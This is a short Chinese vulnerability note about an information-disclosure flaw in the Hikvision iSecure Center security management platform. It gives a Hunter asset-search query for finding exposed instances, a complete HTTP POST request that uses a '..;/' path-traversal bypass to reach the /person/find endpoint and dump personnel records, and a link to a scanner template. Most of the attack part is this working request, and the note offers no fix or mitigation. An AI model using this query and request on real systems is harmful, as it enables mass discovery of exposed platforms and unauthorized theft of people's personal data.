# 海康威视iSecure Center综合安防管理平台find信息泄漏漏洞

# 一、漏洞简介
HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境find等敏感信息进一步攻击。

# 二、影响版本
+ HIKVISION 综合安防管理平台

# 三、<font style="color:rgb(0, 0, 0);">资产测绘</font>
**hunter查询语法：**

`app.name=="Hikvision 海康威视 iSecure Center"`

![1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5.png](./img/XS4nHgxFeZcZ-7E8/1691858054561-aa88559b-46e0-4837-ae4c-6f3e9e3982c5-166014.png)

+ 登录页面

![1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f.png](./img/XS4nHgxFeZcZ-7E8/1691858046745-db2cadc6-9bde-4037-952f-2faf2537b85f-968849.png)

# 四、漏洞复现
```java
POST /isupm/api/api/..;/..;/person/find HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Length: 95
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: application/json;charset=utf-8
Accept-Encoding: gzip, deflate

{"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
```

![1711371978631-07879775-bcdf-4673-853d-c0e370b7119d.png](./img/XS4nHgxFeZcZ-7E8/1711371978631-07879775-bcdf-4673-853d-c0e370b7119d-882927.png)

[hikvision-find-info.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1717211077763-07464109-609f-4f5b-bd65-72b7a7d05fe6.yaml)



> 更新: 2024-06-01 11:04:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vzdf0l0dggn48gti>